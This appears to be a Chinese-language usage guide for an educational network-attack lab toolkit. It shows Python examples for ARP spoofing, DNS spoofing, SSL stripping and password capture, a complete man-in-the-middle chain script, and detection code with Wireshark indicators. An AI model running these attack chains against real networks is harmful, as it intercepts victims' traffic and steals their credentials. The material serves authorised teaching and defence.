# 使用示例

本文档提供详细的使用示例和实验场景。

## 快速开始示例

### 示例1：基本ARP欺骗攻击

```python
from attacks.arp_spoof import ARPSpoofer

# 创建ARP欺骗器
spoofer = ARPSpoofer(
    target_ip="192.168.1.100",  # 目标主机IP
    gateway_ip="192.168.1.1",  # 网关IP
    interface="eth0"  # 网络接口
)

# 开始攻击
spoofer.start()

# 运行一段时间后停止
import time
time.sleep(60)

# 停止攻击并恢复ARP表
spoofer.stop()
```

### 示例2：DNS欺骗攻击

```python
from attacks.dns_spoof import DNSSpoofer

# 创建DNS欺骗器
dns_spoofer = DNSSpoofer(
    spoof_domains=["example.com", "test.com"],
    redirect_ip="192.168.1.200"  # 攻击者IP
)

# 开始攻击
dns_spoofer.start(queue_num=0)

# 停止攻击
dns_spoofer.stop()
```

### 示例3：密码捕获

```python
from attacks.password_capture import PasswordCapture

# 创建密码捕获器
capture = PasswordCapture()

# 开始捕获
capture.start(interface="eth0")

# 运行一段时间
import time
time.sleep(300)

# 停止捕获
capture.stop()

# 获取捕获的密码
passwords = capture.get_captured_passwords()
for pwd in passwords:
    print(f"类型: {pwd['type']}, 用户名: {pwd['username']}, 密码: {pwd['password']}")
```

### 示例4：攻击检测

```python
from defense.attack_detector import AttackDetector

# 创建攻击检测器
detector = AttackDetector()

# 开始检测（在后台线程中运行）
import threading
detect_thread = threading.Thread(target=detector.start_detection, args=("eth0",), daemon=True)
detect_thread.start()

# 运行一段时间后停止
import time
time.sleep(300)

# 停止检测
detector.stop_detection()

# 生成报告
report = detector.generate_report()
print(f"总攻击数: {report['total_attacks']}")
print(f"攻击类型: {report['attack_types']}")
```

### 示例5：网络扫描

```python
from utils.network_scanner import NetworkScanner

# 创建网络扫描器
scanner = NetworkScanner()

# 扫描网络
hosts = scanner.scan_network("192.168.1.0/24")

# 显示结果
for host in hosts:
    print(f"IP: {host['ip']}, MAC: {host['mac']}, 主机名: {host['hostname']}")

# 获取网关信息
gateway = scanner.get_gateway()
if gateway:
    print(f"网关IP: {gateway['ip']}, MAC: {gateway['mac']}")
```

## 完整攻击场景示例

### 场景1：完整的MITM攻击链

```python
#!/usr/bin/env python3
"""
完整的MITM攻击演示
"""

import time
from attacks.arp_spoof import ARPSpoofer
from attacks.dns_spoof import DNSSpoofer
from attacks.ssl_strip import SSLStripper
from attacks.password_capture import PasswordCapture

def main():
    # 配置参数
    target_ip = "192.168.1.100"
    gateway_ip = "192.168.1.1"
    interface = "eth0"
    
    print("[*] 启动完整的MITM攻击链...")
    
    # 步骤1: ARP欺骗
    print("[1] 启动ARP欺骗...")
    arp_spoofer = ARPSpoofer(target_ip, gateway_ip, interface)
    arp_spoofer.start()
    time.sleep(5)
    
    # 步骤2: DNS欺骗
    print("[2] 启动DNS欺骗...")
    dns_spoofer = DNSSpoofer(
        spoof_domains=["example.com"],
        redirect_ip="192.168.1.200"
    )
    dns_spoofer.start()
    time.sleep(5)
    
    # 步骤3: SSL剥离
    print("[3] 启动SSL剥离...")
    ssl_stripper = SSLStripper()
    ssl_stripper.start()
    time.sleep(5)
    
    # 步骤4: 密码捕获
    print("[4] 启动密码捕获...")
    password_capture = PasswordCapture()
    password_capture.start(interface)
    
    # 运行攻击
    print("[*] 攻击运行中... (按Ctrl+C停止)")
    try:
        while True:
            time.sleep(1)
            # 显示捕获的凭据
            creds = ssl_stripper.get_captured_credentials()
            if creds:
                print(f"[+] 已捕获 {len(creds)} 条凭据")
    except KeyboardInterrupt:
        print("\n[!] 停止攻击...")
    
    # 清理
    print("[*] 清理资源...")
    password_capture.stop()
    ssl_stripper.stop()
    dns_spoofer.stop()
    arp_spoofer.stop()
    
    # 显示结果
    print("\n[+] 攻击结果:")
    print(f"  SSL剥离捕获: {len(ssl_stripper.get_captured_credentials())} 条")
    print(f"  密码捕获: {len(password_capture.get_captured_passwords())} 条")

if __name__ == "__main__":
    main()
```

### 场景2：防御演示

```python
#!/usr/bin/env python3
"""
防御演示：检测和应对攻击
"""

import time
import threading
from defense.attack_detector import AttackDetector
from defense.countermeasures import Countermeasures

def main():
    print("[*] 启动防御系统...")
    
    # 启动攻击检测
    detector = AttackDetector()
    detect_thread = threading.Thread(
        target=detector.start_detection,
        args=("eth0",),
        daemon=True
    )
    detect_thread.start()
    
    print("[*] 攻击检测运行中... (按Ctrl+C停止)")
    
    try:
        while True:
            time.sleep(10)
            
            # 每10秒检查一次攻击
            attacks = detector.get_detected_attacks()
            if attacks:
                print(f"\n[!] 检测到 {len(attacks)} 个攻击:")
                for attack in attacks[-5:]:  # 显示最近5个
                    print(f"  类型: {attack['type']}, 严重程度: {attack['severity']}")
                
                # 生成报告
                report = detector.generate_report()
                print(f"\n报告摘要:")
                print(f"  总攻击数: {report['total_attacks']}")
                print(f"  攻击类型分布: {report['attack_types']}")
                
                # 应用防御对策
                print("\n[*] 应用防御对策...")
                countermeasures = Countermeasures()
                countermeasures.apply_all_countermeasures()
    
    except KeyboardInterrupt:
        print("\n[!] 停止检测...")
        detector.stop_detection()

if __name__ == "__main__":
    main()
```

## Wireshark分析示例

### 分析ARP欺骗

1. 启动Wireshark并选择网络接口
2. 使用过滤器：`arp`
3. 观察ARP请求和响应
4. 查找异常的MAC地址映射

**关键指标**：
- 同一IP对应多个MAC地址
- ARP响应频率异常高
- 网关MAC地址突然改变

### 分析DNS欺骗

1. 使用过滤器：`dns`
2. 查找DNS查询和响应
3. 检查DNS响应的IP地址
4. 验证域名解析的正确性

**关键指标**：
- DNS响应中的IP地址与预期不符
- DNS响应的TTL值异常
- 多个DNS响应指向不同IP

### 分析SSL/TLS握手

1. 使用过滤器：`tcp.port == 443`
2. 查找Client Hello和Server Hello
3. 分析证书交换过程

**关键指标**：
- SSL握手失败
- 证书验证错误
- HTTPS连接被降级为HTTP

## 实验报告模板

### 实验目的
描述实验的目标和学习内容。

### 实验环境
- 操作系统：Kali Linux 2024.x
- 网络拓扑：描述网络结构
- 工具版本：列出使用的工具版本

### 实验步骤
1. 环境准备
2. 攻击执行
3. 数据收集
4. 结果分析

### 实验结果
- 攻击成功率
- 捕获的数据
- 检测到的攻击

### 防御措施
- 实施的防御策略
- 防御效果评估

### 总结与思考
- 攻击原理理解
- 防御方法总结
- 改进建议

---

**注意**：所有示例代码仅用于教育和研究目的。请确保在授权环境中使用。

